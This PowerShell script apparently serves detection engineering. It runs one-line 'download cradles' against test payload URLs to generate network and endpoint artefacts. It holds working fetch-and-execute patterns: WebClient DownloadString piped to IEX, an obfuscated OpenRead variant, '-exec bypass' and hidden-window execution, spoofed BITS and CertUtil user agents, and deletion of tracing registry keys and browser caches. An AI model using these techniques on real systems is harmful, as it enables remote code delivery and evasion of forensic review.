<#
.SYNOPSIS
	Invoke-DownloadCradle.ps1 runs several single liner Download cradles.
    Name: Invoke-DownloadCradle.ps1
    Version: 0.21
    Author: Matt Green (@mgreen27)
.DESCRIPTION
    Invoke-DownloadCradle.ps1 is used to generate Network and Endpoint artefacts for detection work.
    The script runs several single liner Download cradles and is configurable to spawn a new child process per cradle.
    The script will also clear registry and IE cache prior to the relevant Download Cradle.
.NOTES
    Requires ISE mode if wanting visual confirmation of cradle success - i.e what testing stuff.
    
    Currently manual configuration below. Please configure:
        1. $TLS = 1 to use TLS, $TLS = 0 to use http
        2. Configure $URL settings. 
        
.TODO
    Add in switch for cradle by number and associated help.
    Add in array input for integration with tools like invoke-cradlecrafter
#>

$Url = @(
    "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/test.ps1", # Basic Powershell Test script
    "test.dfir.com.au", # DNS text test - Powershell Test script base64 encoded in DNS txt field
    "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/test.xml", # Powershell embedded command
    "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/test.sct", # Powershell embedded scriptlet
    "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/mshta.sct", # Powershell embedded scriptlet
    "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/test.xsl" # Powershell embedded extensible Stylesheet Language
)

# Setting randomly generated $Outfile for payloads that hit disk
$Random = -join ((48..57) + (97..122) | Get-Random -Count 32 | % {[char]$_})
$Outfile = "C:\Windows\Temp\" + $Random


function Invoke-DownloadCradle
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)][String]$Type,
        [Parameter(Mandatory = $True)][String]$Command
        )
    
    # Clear cache and other relevant files
    Remove-Item -path HKLM:\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32 -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -path HKLM:\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -path "$env:USERPROFILE\AppData\Local\Microsoft\Windows\Temporary Internet Files\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -path "$env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -path "$env:USERPROFILE\AppData\Local\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -path "$env:USERPROFILE\AppData\Roaming\Microsoft\Office\*" -Recurse -Force -ErrorAction SilentlyContinue
    
    if (Test-path $Outfile){Remove-Item $Outfile -Force}
    
    If ($Type -eq "Powershell"){
        Try{powershell -exec bypass -noprofile $Command}
        Catch{$_}
    }
    ElseIf ($Type -eq "Regsvr32"){
        Try{
            powershell -exec bypass -noprofile $Command
            $(Get-Date -Format s) + " Success - see popup window!`n"
        }
        Catch{$_}
    }
    ElseIf ($Type -eq "CMD"){
        Try{
            cmd /c $Command
            $(Get-Date -Format s) + " Success - see popup window!`n"
        }
        Catch{$_}
    }
    
    If($Sleep){Start-Sleep -s 10}
    
    [gc]::Collect()
}



# check if running in Powershell ISE as required
if($host.Name -eq 'ConsoleHost') {
    Write-Host -ForegroundColor Yellow "Invoke-DownloadCradle: Run in Powershell ISE for interactive mode`n"
    "Sleeping for 10 seconds to allow quit"
    Start-Sleep -s 10
}

# Test for Elevated privilege if required
If (!(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))){
    Write-Host -ForegroundColor Red "Exiting Invoke-DownloadCradle: Elevated privilege required to remove cache files"
    exit
}


clear
Write-Host -ForegroundColor Cyan "Testing Download Cradle methods...`n"


# Setting proxy
(New-Object Net.WebClient).Proxy=[Net.WebRequest]::GetSystemWebProxy()
(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials

# deleting temp file
if (Test-path $Outfile){Remove-Item $Outfile -Force}


<### Additional goodies
# .Net Cradles are effectively the same as Powershell WebClient and I found less cross compatibility. Same artifacts
".Net WebClient DownloadString"
([System.Net.WebClient]::new()).DownloadString($Url[0]) | IEX
".Net WebClient DownloadData"
[System.Text.Encoding]::ASCII.GetString(([System.Net.WebClient]::new()).DownloadData($Url[0])) | IEX
".Net WebClient DownloadData"
$or='OpenRead';$sr=.(GCM N*-O*)IO.StreamReader(([System.Net.WebClient]::new()).$or($url[0]));$res=$sr.ReadToEnd();$sr.Close();IEX $res
# Custom User-Agent configuration for testing detections
$Url = "https://raw.githubusercontent.com/mgreen27/testing/master/test.ps1"
$webclient=(New-Object System.Net.WebClient)
$webclient.Proxy=[System.Net.WebRequest]::GetSystemWebProxy()
$webclient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
$webClient.Headers.Add("User-Agent", "HONEYBADGER")
$webclient.DownloadString($Url) | Out-Null;"HONEYBADGER completed"
$webClient.Headers.Add("User-Agent", "Microsoft BITS/HONEYBADGER")
$webclient.DownloadString($Url) | Out-Null;"Fake Microsoft BITS completed"
$webClient.Headers.Add("User-Agent", "Microsoft-CryptpAPI/HONEYBADGER")
$webclient.DownloadString($Url) | Out-Null;"Fake Microsoft-CryptoAPI completed"
$webClient.Headers.Add("User-Agent", "CertUtil URL Agent HONEYBADGER")
$webclient.DownloadString($Url) | Out-Null;"Fake CertUtil URL Agent completed"
$webClient.Headers.Add("User-Agent", "Mozilla/X.X (Windows NT; Windows NT X.X; en-AU) WindowsPowerShell/HONEYBADGER")
$webclient.DownloadString($Url) | Out-Null;"Fake Powershell WebRequest completed"
$webClient.Headers.Add("User-Agent", "Mozilla/\* (compatible; MSIE \X; Windows NT \X; Win64; x64; Trident/HONEYBADGER; .NET\X; .NET CLR \X)")
$webclient.DownloadString($Url) | Out-Null;"Fake .NET User-Agent completed"
# Execution
powershell -exec bypass -windowstyle hidden -noprofile $Command
cmd /c
#>